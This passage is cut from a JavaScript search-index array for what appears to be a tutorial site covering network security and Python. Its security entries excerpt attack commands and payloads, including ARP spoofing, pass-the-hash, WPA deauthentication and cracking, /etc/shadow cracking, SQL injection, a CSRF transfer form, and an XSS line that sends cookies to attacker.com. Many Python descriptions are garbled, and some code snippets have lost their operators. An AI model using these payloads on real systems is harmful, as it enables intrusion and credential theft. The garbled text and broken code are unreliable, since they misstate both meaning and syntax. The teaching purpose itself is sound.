    { title: "TLS/SSL", desc: "Transport Layer Security and certificate management", id: "tls-ssl" },
    { title: "Nmap", desc: "Network discovery and security auditing", id: "nmap" },
    { title: "Metasploit", desc: "Penetration testing framework", id: "metasploit" },
    { title: "Burp Suite", desc: "Web application security testing platform", id: "burp-suite" },
    { title: "Wireshark", desc: "Network protocol analyzer", id: "wireshark" },
    { title: "Hashcat & John", desc: "Password recovery and hash cracking", id: "hashcat" },
    { title: "OWASP Top 10", desc: "Critical web application security risks", id: "owasp-top10" },
    { title: "XSS", desc: "Cross-site scripting attacks and prevention", id: "xss" },
    { title: "SQL Injection", desc: "Database query manipulation and defense", id: "sql-injection" },
    { title: "CSRF", desc: "Cross-site request forgery and protection", id: "csrf" },
    { title: "Web Defense", desc: "Security headers, WAF, and best practices", id: "web-defense" },
    { title: "Network Segmentation", desc: "VLANs, zones, and isolation strategies", id: "network-segmentation" },
    { title: "Bastion Host", desc: "Hardened gateway for secure admin access", id: "bastion-host" },
    { title: "Zero Trust", desc: "Never trust, always verify architecture", id: "zero-trust" },
    { title: "Hardening", desc: "System hardening and security benchmarks", id: "hardening" },
    { title: "The CIA Triad", desc: "The foundation of all information security rests on three core principles:", id: "intro-the-cia-triad" },
    { title: "Encapsulation & Decapsulation", desc: "As data travels down the OSI stack, each layer adds a header (and sometimes a trailer). At the receiving end, each layer strips its corresponding header and… — Data Flow (Sender -> Receiver):; Layer 7: Application Data; Layer 6: [Presentation Header] + Application Data; Layer 5: [Session Header] + [Presentation Header] + Data; Layer 4: [TCP Header] + [Session Header] + ... -> Segment; Layer 3: [IP Header] + [TCP…", id: "osi-model-encapsulation-decapsulation" },
    { title: "TCP Three-Way Handshake", desc: "Before any data flows, TCP establishes a reliable connection with three packets: a SYN, a SYN-ACK, and an ACK. Closing a connection is a similar four-step… — Client Server | SYN (seq=x) | | ----------------------> | | SYN-ACK (seq=y, ack=x+1) | | ACK (ack=y+1) | | ----------------------> | | | | Connection established |", id: "tcp-ip-tcp-three-way-handshake" },
    { title: "ARP (Address Resolution Protocol)", desc: "ARP maps IP addresses to MAC addresses on a local network. It's a stateless, trustless protocol with no authentication — making it vulnerable to poisoning… — arp -a; ip neigh; arpspoof -i eth0 -t 192.168.1.10 192.168.1.1; arpspoof -i eth0 -t 192.168.1.1 192.168.1.10; echo 1 > /proc/sys/net/ipv4/ip_forward; arp -s 192.168.1.1 00:11:22:33:44:55", id: "protocols-arp-address-resolution-protocol" },
    { title: "DNS (Domain Name System)", desc: "DNS translates human-readable domain names to IP addresses. It's a critical attack surface due to its hierarchical, distributed nature. — dig example.com; dig @8.8.8.8 example.com MX; dig +trace example.com; nslookup example.com; host example.com; dnsenum example.com", id: "protocols-dns-domain-name-system" },
    { title: "ICMP (Internet Control Message Protocol)", desc: "ICMP is used for error reporting and diagnostic functions. While essential for network troubleshooting, it can be abused for reconnaissance and attacks. — ping -c 4 8.8.8.8; iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second -j ACCEPT; iptables -A INPUT -p icmp --icmp-type echo-request -j DROP", id: "protocols-icmp-internet-control-message-protocol" },
    { title: "Common iptables Commands", desc: "List all rules with line numbers and verbose output. — iptables -L -n -v --line-numbers; iptables -P INPUT DROP; iptables -P FORWARD DROP; iptables -P OUTPUT ACCEPT; iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT; iptables -A INPUT -i lo -j ACCEPT", id: "iptables-common-iptables-commands" },
    { title: "Passive Reconnaissance", desc: "WHOIS lookup. — whois example.com; dig example.com ANY; dig @ns1.example.com example.com axfr; sublist3r -d example.com; amass enum -d example.com; gobuster dns -d example.com -w /usr/share/wordlists/dns.txt", id: "reconnaissance-passive-reconnaissance" },
    { title: "Active Reconnaissance", desc: "Ping sweep to find live hosts. — nmap -sn 192.168.1.0/24; arp-scan -l; traceroute example.com; mtr example.com; nc -v example.com 80; telnet example.com 22", id: "reconnaissance-active-reconnaissance" },
    { title: "Nmap — The Network Mapper", desc: "Basic port scan. — nmap 192.168.1.1; nmap -p- 192.168.1.1; nmap -sV 192.168.1.1; nmap -O 192.168.1.1; nmap -A 192.168.1.1; nmap -sS 192.168.1.1", id: "scanning-nmap-the-network-mapper" },
    { title: "Enumeration Techniques", desc: "SMB enumeration. — enum4linux -a 192.168.1.10; smbclient -L //192.168.1.10; rpcclient -U \"\" 192.168.1.10; snmpwalk -c public -v1 192.168.1.10; onesixtyone -c community.txt 192.168.1.0/24; dnsenum example.com", id: "scanning-enumeration-techniques" },
    { title: "Metasploit Framework", desc: "Start Metasploit. — msfconsole; msf6 > search type:exploit name:apache; msf6 > search cve:2024 platform:linux; msf6 > use exploit/multi/http/apache_normalize_path_rce; msf6 > show options; msf6 > set RHOSTS 192.168.1.10", id: "exploitation-metasploit-framework" },
    { title: "Privilege Escalation", desc: "Linux privilege escalation enumeration. — linpeas.sh; linenum.sh; unix-privesc-check; sudo -l; find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null", id: "post-exploitation-privilege-escalation" },
    { title: "Lateral Movement", desc: "Pass-the-hash (Windows) — pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:hash //192.168.1.20 cmd; ssh -i id_rsa user@pivot-host; nmap -sT 10.0.0.0/24; proxychains nmap -sT 10.0.0.0/24; ssh -D 1080 -i id_rsa user@compromised-host; bloodhound-python -d example.com -u user…", id: "post-exploitation-lateral-movement" },
    { title: "Wireless Modes", desc: "Check wireless interface. — iwconfig; ip link show; airmon-ng check kill; airmon-ng start wlan0; airodump-ng wlan0mon; airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", id: "wireless-standards-wireless-modes" },
    { title: "4-Way Handshake", desc: "The WPA2 4-way handshake is used to derive the Pairwise Transient Key (PTK) from the Pairwise Master Key (PMK). Capturing this handshake is the basis for… — airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon; aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon; aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap; hcxpcapngtool -o hash.hc22000 handshake-01.cap; hashcat -m…", id: "wep-wpa-4-way-handshake" },
    { title: "Attack Types", desc: "WPS PIN attack with Reaver. — reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv; hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1; hcxpcapngtool -o hash.hc22000 -E wordlist capture.pcapng; hashcat -m 22000 hash.hc22000 wordlist; wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade;…", id: "wireless-attacks-attack-types" },
    { title: "Best Practices", desc: "Detect rogue APs with Kismet. — kismet -c wlan0mon; airodump-ng --bssid YOUR:AP:MAC -c 6 wlan0mon; wash -i wlan0mon", id: "wireless-defense-best-practices" },
    { title: "IDS/IPS Placement", desc: "Internet | v [Firewall] ----> [NIDS/IPS] ----> [Internal Network] | | | +---> [DMZ Segment] | +---> [Critical Assets Segment] | v [Web Servers] [HIDS on each server]", id: "ids-ips-concepts-ids-ips-placement" },
    { title: "Writing Snort Rules", desc: "Snort rule syntax: — alert tcp any any -> any 80 ( msg : \"SQL Injection Attempt Detected\" ; content : \"union select\" ; nocase ; sid : 1000001 ; rev : 1 ;); alert tcp any any -> $HOME_NET any ( msg : \"Port Scan Detected\" ; flags : S ; threshold : type both , track by_src , count…", id: "snort-writing-snort-rules" },
    { title: "Suricata Features Beyond Snort", desc: "Suricata rule with file extraction. — alert http any any -> any any ( msg : \"EXE Download Detected\" ; file.name ; content : \".exe\" ; file.store ; sid : 2000001 ; rev : 1 ;); alert tls any any -> any any ( msg : \"Suspicious JA3 Fingerprint\" ; ja3.hash ; content : \"e7d705a00be9e9d5a7e9d5a7e9d5a7e9\"…", id: "suricata-suricata-features-beyond-snort" },
    { title: "Wazuh — Open Source SIEM/XDR", desc: "Install Wazuh server (using the quickstart script) — curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh; bash wazuh-install.sh -a; wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.0-1_amd64.deb; dpkg -i wazuh-agent_4.7.0-1_amd64.deb; sed -i 's/MANAGER_IP/192.168.1.10/'…", id: "siem-wazuh-open-source-siem-xdr" },
    { title: "IPsec Modes", desc: "StrongSwan (Linux IPsec implementation) — apt install strongswan; config setup; charondebug = \"all\"; uniqueids = yes; conn ikev2-vpn; auto = add", id: "ipsec-ipsec-modes" },
    { title: "Certificate Management", desc: "Generate a private key and CSR. — openssl req -newkey rsa:4096 -keyout server.key -out server.csr -nodes; openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes; certbot certonly --standalone -d example.com; certbot --nginx -d example.com; certbot renew…", id: "tls-ssl-certificate-management" },
    { title: "Advanced Nmap Techniques", desc: "Stealth scan (SYN scan without completing handshake) — nmap -sS -T2 target.com; nmap -sN target.com; nmap -sF target.com; nmap -sX target.com; nmap -f target.com; nmap -ff target.com", id: "nmap-advanced-nmap-techniques" },
    { title: "Nmap NSE Scripts", desc: "List all NSE scripts. — ls /usr/share/nmap/scripts/; nmap --script http-enum target.com; nmap --script http-title target.com; nmap --script http-headers target.com; nmap --script smb-enum-shares target.com; nmap --script smb-vuln-ms17-010 target.com", id: "nmap-nmap-nse-scripts" },
    { title: "Metasploit Architecture", desc: "Start Metasploit. — msfconsole; msf6 > search type:exploit platform:windows; msf6 > search cve:2024 rank:excellent; msf6 > search name:apache; msf6 > use exploit/windows/smb/ms17_010_eternalblue; msf6 > show options", id: "metasploit-metasploit-architecture" },
    { title: "Common Burp Suite Workflows", desc: "Should return the normal page if the field is injectable. — ' OR '1'='1; ' UNION SELECT null,null--; ' AND 1=1--; ' AND 1=2--; <script>alert('XSS')</script>; <img src=x onerror=alert('XSS')>", id: "burp-suite-common-burp-suite-workflows" },
    { title: "Capture Filters (BPF Syntax)", desc: "Capture only HTTP traffic. — tcp port 80; host 192.168.1.10; net 192.168.1.0/24; icmp; tcp port 22 and not host 192.168.1.5; udp port 53", id: "wireshark-capture-filters-bpf-syntax" },
    { title: "Display Filters", desc: "Filter by IP address. — ip.addr == 192.168.1.10; ip.src == 192.168.1.10; ip.dst == 192.168.1.10; http; dns; tcp", id: "wireshark-display-filters" },
    { title: "Tshark (Command-Line Wireshark)", desc: "Capture and display packets. — tshark -i eth0; tshark -i eth0 -w capture.pcap; tshark -r capture.pcap -Y \"http.request\"; tshark -r capture.pcap -Y \"http.request\" -T fields -e http.host -e http.request.uri; tshark -r capture.pcap -Y \"dns.flags.response == 0\" -T fields -e dns.qry.name;…", id: "wireshark-tshark-command-line-wireshark" },
    { title: "Hashcat", desc: "Identify hash type. — hashid \"5f4dcc3b5aa765d61d8327deb882cf99\"; hashcat --help | grep -i ntlm; hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt; hashcat -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt; hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt;…", id: "hashcat-hashcat" },
    { title: "John the Ripper", desc: "Crack Linux password hashes (/etc/shadow) — unshadow /etc/passwd /etc/shadow > hashes.txt; john hashes.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt; john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt; john --show hashes.txt; zip2john protected.zip > zip.hash", id: "hashcat-john-the-ripper" },
    { title: "XSS Payloads", desc: "A few basic proof-of-concept payloads to confirm a field is vulnerable: — < script >alert( 'XSS' )</ script >; < img src = x onerror = alert('XSS') >; < svg onload = alert('XSS') >; < body onload = alert('XSS') >; < script > new Image().src= \"http://attacker.com/steal?cookie=\" +document.cookie;</ script >; < script >…", id: "xss-xss-payloads" },
    { title: "SQL Injection Payloads", desc: "Authentication bypass. — ' OR '1'='1' --; ' OR '1'='1' /*; ' OR 1=1#; admin' --; admin' #; ' OR '1'='1' LIMIT 1 --", id: "sql-injection-sql-injection-payloads" },
    { title: "SQL Injection Prevention", desc: "String-formatting user input directly into a query is what makes injection possible: — def get_user (username): query = f\"SELECT * FROM users WHERE username = '{username}'\" return db.execute(query); def get_user (username): query = \"SELECT * FROM users WHERE username = %s\" return db.execute(query, (username,)); from sqlalchemy.orm import…", id: "sql-injection-sql-injection-prevention" },
    { title: "How CSRF Works", desc: "CSRF attack payload (malicious website) — < form action = \"https://bank.com/transfer\" method = \"POST\" id = \"csrf-form\" >; < input type = \"hidden\" name = \"to_account\" value = \"attacker_account\" >; < input type = \"hidden\" name = \"amount\" value = \"10000\" >; </ form >; < script >document.getElementById(…", id: "csrf-how-csrf-works" },
    { title: "CSRF Prevention", desc: "Flask-WTF issues and checks a CSRF token automatically once enabled: — from flask_wtf.csrf import CSRFProtect csrf = CSRFProtect(app); < form method = \"POST\" > {{ csrf_token() }} < input type = \"text\" name = \"username\" > < button type = \"submit\" >Submit</ button > </ form >; app.config [ 'SESSION_COOKIE_SAMESITE' ] = 'Lax'…", id: "csrf-csrf-prevention" },
    { title: "Security Headers", desc: "Essential security headers in Nginx. — add_header Content-Security-Policy \"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self';…", id: "web-defense-security-headers" },
    { title: "Web Application Firewall (WAF)", desc: "A WAF filters, monitors, and blocks HTTP traffic to and from a web application. It protects against SQL injection, XSS, CSRF, and other web attacks. — modsecurity on ;; modsecurity_rules_file /etc/nginx/modsec/main.conf ;; Include /etc/nginx/modsec/modsecurity.conf; Include /usr/share/modsecurity-crs/crs-setup.conf; Include /usr/share/modsecurity-crs/rules/*.conf", id: "web-defense-web-application-firewall-waf" },
    { title: "Common Network Zones", desc: "Internet | v [Edge Firewall] ------------------[VPN Gateway] | | v v [DMZ] [Remote Users] (Web Servers, Mail) | | v v [Internal Network] [Internal Firewall] | | +-- [Workstations VLAN 10] v +-- [Servers VLAN 20] [Internal Network] +-- [Database VLAN 30] | +--…", id: "network-segmentation-common-network-zones" },
    { title: "VLAN Configuration (Cisco IOS)", desc: "! Create VLANs. — vlan 10; name Workstations; vlan 20; name Servers; vlan 30; name Database", id: "network-segmentation-vlan-configuration-cisco-ios" },
    { title: "Bastion Host Best Practices", desc: "Harden SSH on bastion host (/etc/ssh/sshd_config) — PermitRootLogin no; PasswordAuthentication no; PubkeyAuthentication yes; AuthenticationMethods publickey,keyboard-interactive; ChallengeResponseAuthentication yes; UsePAM yes", id: "bastion-host-bastion-host-best-practices" },
    { title: "Linux Server Hardening Checklist", desc: "1. Keep system updated. — apt update && apt upgrade -y; apt install unattended-upgrades; ufw default deny incoming; ufw default allow outgoing; ufw allow ssh; ufw allow http", id: "hardening-linux-server-hardening-checklist" },
    { title: "Security Benchmarks", desc: "OpenSCAP compliance scan (CIS benchmark) — apt install libopenscap8 scap-workbench; oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis --results scan-results.xml --report scan-report.html /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml", id: "hardening-security-benchmarks" }
  ],
  python: [
    { title: "Introduction to Python", desc: "Python What is it and why should you or", id: "intro" },
    { title: "Installation and Setup", desc: "Python and creating virtual environment", id: "install" },
    { title: "Basic Syntax", desc: "Basic rules for writing Python code", id: "syntax" },
    { title: "Variables and Data Types", desc: "Storing and managing data‌", id: "variables" },
    { title: "Operators", desc: "OperatorsPython", id: "operators" },
    { title: "Conditional if-else", desc: "orWith condition‌", id: "if-else" },
    { title: "Loops", desc: "for while", id: "loops" },
    { title: "Comprehension", desc: "Data Structures ", id: "comprehensions" },
    { title: "Match-Case", desc: "Pattern Matching in Python 3.10+ — def http_status (status): match status: case 200 : return \"OK\" case 404 : return \"Not Found\" case 500 : return \"Server Error\" case _: return \"Unknown status\"; match status: case 200 | 201 : print ( \"Success\" ) case 400 | 401 | 403 | 404 : print ( \"Client Error\" ); match point: case [ 0 , 0 ]: print…", id: "match-case" },
    { title: "Lists", desc: "Sequential and mutable data structure", id: "lists" },
    { title: "Tuples", desc: "Data Immutable — point = ( 3 , 4 ) single = ( 5 ,) empty = () coords = 1 , 2 , 3; print (point[ 0 ]) print (point[ -1 ]) print (point[ 1 :]); x, y = point a, b, c = coords; locations = { ( 0 , 0 ): \"Origin\" , ( 1 , 0 ): \"East\" , ( 0 , 1 ): \"North\" }; from collections import namedtuple; Point = namedtuple( \"Point\" ,…", id: "tuples" },
    { title: "Dictionaries", desc: "Key-value data structure", id: "dicts" },
    { title: "Sets", desc: "Data structure with unique members — fruits = { \"\" , \"And\" , \"\" }; numbers = set ([ 1 , 2 , 2 , 3 , 3 , 3 ]); empty = set (); a = { 1 , 2 , 3 , 4 }; b = { 3 , 4 , 5 , 6 }; print (a | b); print (a.union(b)); print (a & b); print (a.intersection(b)); print (a - b)", id: "sets" },
    { title: "Strings", desc: "Working with text in Python", id: "strings" },
    { title: "Functions", desc: "Definition and use of Functions", id: "functions" },
    { title: "Lambda", desc: "Anonymous one-line functions — square = lambda x: x ** 2 print ( square ( 5 )); add = lambda x, y: x + y print ( add ( 3 , 4 )); numbers = [ 1 , 2 , 3 , 4 , 5 ] squared = list ( map ( lambda x: x ** 2 , numbers)); evens = list ( filter ( lambda x: x % 2 == 0 , numbers)); words = [ \"banana\" , \"pie\" , \"Washington\" ]…", id: "lambda" },
    { title: "Decorators", desc: "Functions", id: "decorators" },
    { title: "Modules and Packages", desc: "Organization — import math print (math.pi) print (math.sqrt( 16 )); from math import pi, sqrt print (pi); import numpy as np import pandas as pd; from math import *; if __name__ == \"__main__\" : print ( \"This file…", id: "modules" },
    { title: "Generators", desc: "Generating values lazily — def count_up_to (n): count = 1 while count yield count count += 1; counter = count_up_to ( 5 ) print ( next (counter)) print ( next (counter)); squares = (x ** 2 for x in range ( 1000000 )); def fibonacci (n): a, b = 0 , 1 for _ in range (n): yield a a, b = b, a + b; for num in fibonacci ( 10 ):…", id: "generators" },
    { title: "Classes and Objects", desc: "With OOP", id: "classes" },
    { title: "Inheritance", desc: "‌Class‌ — class Animal : def __init__ (self, name): self.name = name def speak (self): raise NotImplementedError( \"Subclass must implement\" ) def introduce (self): return f\"I am {self.name}\"; class Dog…", id: "inheritance" },
    { title: "Encapsulation", desc: "‌Data‌ — class BankAccount : def __init__ (self, owner, balance= 0 ): self.owner = owner self.__balance = balance self._transaction_count = 0 @property def balance (self): return self.__balance @balance.setter def balance (self, value): if value 0 : raise ValueError( \"Balance cannot be negative\" )…", id: "encapsulation" },
    { title: "Polymorphism", desc: "One interface, different implementations — class Duck : def speak (self): return \"Quack!\" def move (self): return \"Swimming\"; class Dog : def speak (self): return \"Woof!\" def move (self): return \"Running\"; def animal_concert (animals): for animal in animals: print (animal.speak()); animal_concert ([ Duck (), Dog ()]); from abc import ABC,…", id: "polymorphism" },
    { title: "Magic Methods", desc: "Methoddunder — class Vector : def __init__ (self, x, y): self.x = x self.y = y def __str__ (self): return f\"Vector({self.x}, {self.y})\" def __repr__ (self): return f\"Vector({self.x!r}, {self.y!r})\" def __add__ (self, other): return Vector(self.x + other.x, self.y + other.y) def __sub__ (self, other): return…", id: "magic-methods" },
    { title: "Read and write File", desc: "File Handling", id: "file-io" },
    { title: "Context Manager", desc: "Managing resources with with — class DatabaseConnection : def __init__ (self, host): self.host = host self.connection = None def __enter__ (self): print ( f\"Connecting to {self.host}...\" ) self.connection = \"connected\" return self def __exit__ (self, exc_type, exc_val, exc_tb): print ( \"Closing connection...\" ) self.connection =…", id: "context-managers" },
    { title: "CSV and JSON", desc: "Format‌Data", id: "csv-json" },
    { title: "Try-Except", desc: "Error Handling — try : result = 10 / 0 except ZeroDivisionError: print ( \"‌Power Division \" ); try : num = int ( \"abc\" ) except ValueError: print ( \"Value Name\" ) except TypeError: print ( \"Type Name\" ); try : open ( \"nonexistent.txt\" ) except FileNotFoundError as e: print ( f\"Error: {e}\" ) print ( f\"Filename:…", id: "try-except" },
    { title: "Custom Exceptions", desc: "Creating your own exceptions — class ValidationError (Exception): \"\"\"Raised when input validation fails.\"\"\" pass; class InsufficientFundsError (Exception): def __init__ (self, balance, amount): self.balance = balance self.amount = amount super ().__init__( f\"Insufficient funds: balance={balance}, requested={amount}\" ); class…", id: "custom-exceptions" },
    { title: "Finally and Else", desc: "Complementary parts of try-except — try : print ( \"Trying...\" ) result = 10 / 2 except ZeroDivisionError: print ( \"Caught ZeroDivisionError\" ) else : print ( f\"Success! Result: {result}\" ) finally : print ( \"Always executes\" ); def demo (): try : return \"try\" finally : print ( \"finally executes before return!\" ); print ( demo ());…", id: "finally-else" },
    { title: "Iterators", desc: "And iteration — class Countdown : def __init__ (self, start): self.start = start def __iter__ (self): return self def __next__ (self): if self.start 0 : raise StopIteration self.start -= 1 return self.start + 1; for num in Countdown ( 5 ): print (num); class Range : def __init__ (self, start, end): self.start =…", id: "iterators" },
    { title: "Contextlib", desc: "Context Manager tools — from contextlib import contextmanager, suppress, redirect_stdout import os; @contextmanager def temporary_directory (path): os.makedirs (path, exist_ok= True ) try : yield path finally : os.rmdir (path); with temporary_directory ( \"/tmp/test_dir\" ) as path: print ( f\"Working in {path}\" ); with…", id: "contextlib" },
    { title: "Metaclasses", desc: "Classes that create classes — class SingletonMeta ( type ): _instances = {} def __call__ (cls, *args, **kwargs): if cls not in cls._instances: cls._instances[cls] = super ().__call__(*args, **kwargs) return cls._instances[cls]; class Database (metaclass=SingletonMeta): def __init__ (self): print ( \"Initializing database...\" );…", id: "metaclasses" },
    { title: "Async/Await", desc: "Name‌Asynchronous — import asyncio; async def say_hello (): print ( \"Hello\" ) await asyncio.sleep( 1 ) print ( \"World\" ); async def task (name, delay): print ( f\"Task {name} starting\" ) await asyncio.sleep(delay) print ( f\"Task {name} done\" ) return f\"Result {name}\"; async def main (): results = await asyncio.gather(…", id: "async" },
    { title: "Type Hints", desc: "Python type system — from typing import ( List, Dict, Set, Tuple, Optional, Union, Callable, Iterable, Iterator, Generator, Any, TypeVar, Generic, Protocol ); def process (items: List[ int ]) -> Dict[ str , int ]: return { str (item): item for item in items}; def find (items: List[ str ], target: str ) -> Optional[ int…", id: "typing" },
    { title: "os and sys", desc: "Interacting with the operating system — import os import sys; print (os.getcwd()) os.chdir( \"/tmp\" ) print (os.listdir( \".\" )); os.makedirs( \"path/to/dir\" , exist_ok= True ) os.rmdir( \"empty_dir\" ); path = os.path.join( \"folder\" , \"file.txt\" ) print (os.path.exists(path)) print (os.path.isfile(path)) print (os.path.isdir(path)) print…", id: "os-sys" },
    { title: "datetime", desc: "Working with dates and times — from datetime import datetime, date, time, timedelta, timezone import time as time_module; now = datetime.now() print (now); d = date( 2024 , 1 , 15 ) t = time( 10 , 30 , 0 ) dt = datetime( 2024 , 1 , 15 , 10 , 30 , 0 ); print (now.strftime( \"%Y-%m-%d %H:%M:%S\" )) print (now.strftime( \"%A, %B %d,…", id: "datetime" },
    { title: "Regular Expressions", desc: "Pattern matching regex — import re; text = \"My email is test@example.com and phone is 0912-345-6789\"; match = re.search( r\"\\w+@\\w+\\.\\w+\" , text) if match: print (match.group()) print (match.start()) print (match.end()) print…", id: "re" },
    { title: "Collections", desc: "Specialized data structures — from collections import ( Counter, defaultdict, OrderedDict, deque, namedtuple, ChainMap ); words = [ \"apple\" , \"banana\" , \"apple\" , \"cherry\" , \"banana\" , \"apple\" ] count = Counter(words) print (count) print (count.most_common( 2 )) print (count[ \"apple\" ]) print (count[ \"orange\" ]); d =…", id: "collections" },
    { title: "Itertools", desc: "Iterator tools — import itertools; for i in itertools.count( 10 , 2 ): if i > 20 : break print (i); counter = 0 for item in itertools.cycle([ \"A\" , \"B\" , \"C\" ]): if counter >= 6 : break print (item, end= \" \" ) counter += 1; print ( list (itertools.repeat( \"A\" , 3 ))); print ( list (itertools.chain([ 1 , 2 ], [ 3 ,…", id: "itertools" },
    { title: "unittest", desc: "Test — import unittest; def add (a, b): return a + b; def divide (a, b): if b == 0 : raise ValueError( \"Cannot divide by zero\" ) return a / b; class TestMathOperations (unittest.TestCase): def setUp (self):…", id: "unittest" },
    { title: "pytest", desc: "‌Test — def add (a, b): return a + b; def test_add (): assert add ( 2 , 3 ) == 5; def test_add_negative (): assert add (- 1 , - 1 ) == - 2; import pytest; @pytest.fixture def sample_data (): return [ 1 , 2 , 3 , 4 , 5 ]; def test_sum (sample_data): assert sum (sample_data) == 15; @pytest.fixture (scope=…", id: "pytest" },
    { title: "Debugging Techniques", desc: "And Debugging Techniques — import pdb; def buggy_function (x): y = x + 10 pdb.set_trace() z = y * 2 return z; import logging; logging.basicConfig( level=logging.DEBUG, format= '%(asctime)s - %(name)s - %(levelname)s - %(message)s' ) logger = logging.getLogger(__name__); logger.debug( \"Debug message\" ) logger.info( \"Info…", id: "debugging" },
    { title: "Performance Tips", desc: "Optimizing Python code — result = [] for i in range ( 1000 ): result.append(i * 2 ); result = [ 2 * i for i in range ( 1000 )] result = list ( map ( lambda x: x * 2 , range ( 1000 ))); if item in list (items): pass; item_set = set (items) if item in item_set: pass; result = \"\" for s in strings: result += s; result = \"\"…", id: "performance" },
    { title: "Profiling", desc: "Analyzing code performance — import cProfile import pstats import io; def heavy_computation (): total = 0 for i in range ( 100000 ): total += i ** 2 return total; pr = cProfile.Profile() pr.enable() heavy_computation () pr.disable(); s = io.StringIO() ps = pstats.Stats(pr, stream=s).sort_stats( \"cumulative\" ) ps.print_stats(…", id: "profiling" },
    { title: "Memory Management", desc: "Understanding and optimizing memory usage — import sys; print (sys.getsizeof( 0 )) print (sys.getsizeof( \"\" )) print (sys.getsizeof([])) print (sys.getsizeof({})); import gc; gc.collect(); print (gc.garbage); import weakref; class MyClass : pass; obj = MyClass () ref = weakref.ref(obj) print (ref()); del obj print (ref()); class Resource :…", id: "memory" },
    { title: "Installation on Linux (Recommended)", desc: "Ubuntu/Debian. — sudo apt update; sudo apt install python3 python3-pip python3-venv; sudo dnf install python3 python3-pip; sudo pacman -S python python-pip; python3 --version; pip3 --version", id: "install-installation-on-linux-recommended" },
    { title: "Creating a Virtual Environment", desc: "Create virtual environment. — python3 -m venv myproject_env; source myproject_env/bin/activate; myproject_env\\Scripts\\activate; pip install numpy pandas requests; pip freeze > requirements.txt; pip install -r requirements.txt", id: "install-creating-a-virtual-environment" },
    { title: "First Program", desc: "This is a single-line comment. — \"\"\"This is a multi-line comment\"\"\"; print ( \"Helloor!\" ); print ( \"Name:\" , \"\" , \"Age:\" , 25 ); print ( \"A\" , \"B\" , \"C\" , sep= \"-\" , end= \"!\\n\" )", id: "syntax-first-program" },
    { title: "Indentation", desc: "In Python, indentation is mandatory and replaces braces {} . The standard is to use 4 spaces (never Tab!). — if True : print ( \"This is correct\" ) if True : print ( \"Nested indentation\" ) print ( \"Outside condition\" )", id: "syntax-indentation" },
    { title: "Variable Definition", desc: "Simple definition. — name = \"\"; age = 25; pi = 3.14159; is_active = True; x, y, z = 1 , 2 , 3; a, b = 10 , 20", id: "variables-variable-definition" },
    { title: "Type Hints", desc: "Function with Type Hints. — from typing import List, Dict, Optional, Union; def greet (name: str , age: int ) -> str : return f\"Hello {name}And {age} \"; def find_user (user_id: int ) -> Optional[Dict[ str , str ]]: pass; def process (data: Union[ str , int ]) -> str : return str (data);…", id: "variables-type-hints" },
    { title: "Comparison Operators", desc: "False - Equality. — x = 10; y = 20; print (x == y); print (x != y); print (x > y); print (x < y)", id: "operators-comparison-operators" },
    { title: "Logical Operators", desc: "And - And True With. — age = 25 has_license = True; if age >= 18 and has_license: print ( \"You can drive\" ); if age 13 or age > 65 : print ( \"You have a discount\" ); if not has_license: print ( \"First get a license\" ); result = 0 or \"default\" result = 5 and \"value\" result = not 0", id: "operators-logical-operators" },
    { title: "Bitwise Operators", desc: "10 In. — a = 0b1010; b = 0b1100; print (a & b); print (a | b); print (a ^ b); print (~a)", id: "operators-bitwise-operators" },
    { title: "Assignment Operators", desc: "Walrus operator (:=); Assignment inside condition. — if (n := len ([ 1 , 2 , 3 ])) > 2 : print ( f\"List {n} \" ); while (line := input ( \"Enter: \" )) != \"quit\" : print ( f\"You entered: {line}\" )", id: "operators-assignment-operators" },
    { title: "Basic Structure", desc: "One-line condition (Ternary). — age = 25; if age 13 : print ( \"Child\" ) elif age 20 : print ( \"Teenager\" ) elif age 65 : print ( \"Adult\" ) else : print ( \"Senior\" ); status = \"Adult\" if age >= 18 else \"Minor\"; if age >= 18 : if has_license: print ( \"You can drive\" ) else : print ( \"First…", id: "if-else-basic-structure" },
    { title: "Truthy and Falsy Values", desc: "In Python, the following values are considered False : — name = \"\" items = [ 1 , 2 ]; if name: print ( f\"Hello {name}\" ); if items: print ( f\"{len(items)} items available\" ); result = None if result is None : print ( \"No result found\" ); numbers = [ 1 , 2 , 3 , 0 ] print ( any (numbers)) print ( all (numbers))", id: "if-else-truthy-and-falsy-values" },
    { title: "for Loop", desc: "Loop over list. — fruits = [ \"\" , \"And\" , \"\" ] for fruit in fruits: print (fruit); for i in range ( 5 ): print (i); for i in range ( 2 , 8 ): print (i); for i in range ( 0 , 10 , 2 ): print (i); for index, fruit in enumerate (fruits): print ( f\"{index}: {fruit}\" ); names = […", id: "loops-for-loop" },
    { title: "while Loop", desc: "While else. — count = 0 while count 5 : print (count) count += 1; while count 10 : print (count) count += 1 else : print ( \"Loop completed\" ); while True : user_input = input ( \"Enter a number (q to exit): \" ) if user_input == \"q\" : break try : number = int (user_input)…", id: "loops-while-loop" },
